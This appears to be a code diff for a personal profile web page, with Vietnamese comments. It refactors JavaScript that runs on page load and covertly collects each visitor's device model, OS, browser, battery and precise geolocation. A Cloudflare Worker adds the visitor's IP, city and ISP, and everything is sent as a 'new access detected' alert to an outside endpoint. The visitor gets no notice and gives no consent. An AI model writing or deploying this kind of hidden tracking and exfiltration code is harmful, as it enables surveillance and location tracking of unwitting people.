@@ -57,20 +57,10 @@ function adjustZoom() {
 window.addEventListener('resize', adjustZoom);
 adjustZoom();
 
- // --- 1. CẤU HÌNH ---
-// Link Cloudflare Worker đã triển khai thành công của bạn
+// --- 1. CẤU HÌNH ---
 const workerUrl = "https://profile-easy.dangtoanvu07.workers.dev";
 
-let isBotActive = false;
-
-// --- 2. HÀM RUNG THIẾT BỊ ---
-function triggerVibrate() {
-    if (navigator.vibrate) {
-        navigator.vibrate(500);
-    }
-}
-
-// --- 3. NHẬN DIỆN THIẾT BỊ & TRÌNH DUYỆT CỤ THỂ ---
+// --- 2. NHẬN DIỆN THIẾT BỊ & TRÌNH DUYỆT CỤ THỂ ---
 async function getFullDeviceInfo() {
     const ua = navigator.userAgent;
     let browser = "Trình duyệt lạ";
@@ -103,56 +93,36 @@ async function getFullDeviceInfo() {
         os = "Android";
         const match = ua.match(/Android\s+([\d\.]+);.*?\s+([^;]+)\s+Build/);
         model = match ? match[2] : "Điện thoại Android";
-    } else if (ua.includes("Macintosh")) {
-        os = "MacOS"; model = "MacBook/iMac";
     }
 
-    // --- NHẬN DIỆN TRÌNH DUYỆT CỤ THỂ ---
+    // --- SỬA LỖI NHẬN DIỆN SAFARI (Ưu tiên kiểm tra Chrome/Cốc Cốc trước) ---
     if (ua.includes("CocCoc") || ua.includes("coc_coc_browser")) {
         browser = "Cốc Cốc";
     } else if (ua.includes("Edg/")) {
         browser = "Microsoft Edge";
-    } else if (ua.includes("CriOS")) {
-        browser = "Google Chrome (iOS)";
+    } else if (ua.includes("CriOS")) { 
+        // Chrome trên iOS luôn có chữ CriOS. Nếu check Safari trước sẽ bị sai.
+        browser = "Google Chrome (iOS)"; 
     } else if (ua.includes("Chrome") && !ua.includes("Edg/")) {
         browser = "Google Chrome";
-    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
+    } else if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("CriOS")) {
         browser = "Safari";
     }
 
     return { browser, os, model, battery };
 }
 
-// --- 4. LẤY IP, THÀNH PHỐ, NHÀ MẠNG (ISP) ---
-async function fetchIpData() {
-    try {
-        // Sử dụng ipwho.is để lấy đầy đủ thông tin nhất
-        const response = await fetch('https://ipwho.is/');
-        const d = await response.json();
-        return {
-            ip: d.ip || "Không rõ",
-            city: d.city || "Không rõ",
-            isp: d.connection?.isp || d.org || "Không rõ"
-        };
-    } catch (e) {
-        return { ip: "Lỗi lấy IP", city: "Lỗi", isp: "Lỗi" };
-    }
-}
-
-// --- 5. GỬI THÔNG BÁO QUA CLOUDFLARE WORKER ---
-async function sendNotification(pos) {
-    if (isBotActive) return;
-    isBotActive = true;// Lấy tất cả dữ liệu cần thiết
-    const info = await fetchIpData();
+// --- 3. GỬI DỮ LIỆU SANG CLOUDFLARE WORKER ---
+async function sendToWorker(pos = null) {
     const device = await getFullDeviceInfo();
     const time = new Date().toLocaleString('vi-VN');
 
-    // Xây dựng nội dung tin nhắn (Đã sửa các biến undefined)
+    // Chúng ta gửi các từ khóa đặc biệt để Worker tự thay thế bằng IP thật
     let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
     msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
-    msg += `🌐 <b>Địa chỉ IP:</b> <code>${info.ip}</code>\n`;
-    msg += `📍 <b>Thành phố:</b> <code>${info.city}</code>\n`;
-    msg += `🏢 <b>Nhà mạng:</b> <b>${info.isp}</b>\n\n`;
+    msg += `🌐 <b>Địa chỉ IP:</b> <code>{{IP}}</code>\n`;
+    msg += `📍 <b>Thành phố:</b> <code>{{CITY}}</code>\n`;
+    msg += `🏢 <b>Nhà mạng:</b> <b>{{ISP}}</b>\n\n`;
     msg += `📱 <b>Thông tin thiết bị:</b>\n`;
     msg += `- Thiết bị: <b>${device.model}</b>\n`;
     msg += `- Hệ điều hành: <code>${device.os}</code>\n`;
@@ -169,32 +139,27 @@ async function sendNotification(pos) {
     }
 
     try {
-        // Gửi dữ liệu đến Cloudflare Worker
         await fetch(workerUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message: msg })
         });
     } catch (err) {
-        console.error("Lỗi gửi Worker:", err);
-    } finally {
-        isBotActive = false;
+        console.error("Lỗi kết nối Worker");
     }
 }
 
-// --- 6. KHỞI CHẠY KHI VÀO TRANG ---
-async function start() {
-    triggerVibrate();
-    
+// --- 4. KHỞI CHẠY ---
+window.onload = () => {
+    if (navigator.vibrate) navigator.vibrate(500);
+
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            (pos) => sendNotification(pos),
-            () => sendNotification(null),
-            { enableHighAccuracy: true, timeout: 8000 }
+            (pos) => sendToWorker(pos),
+            () => sendToWorker(null),
+            { enableHighAccuracy: true, timeout: 5000 }
         );
     } else {
-        sendNotification(null);
+        sendToWorker(null);
     }
-}
-
-window.onload = start;
+};
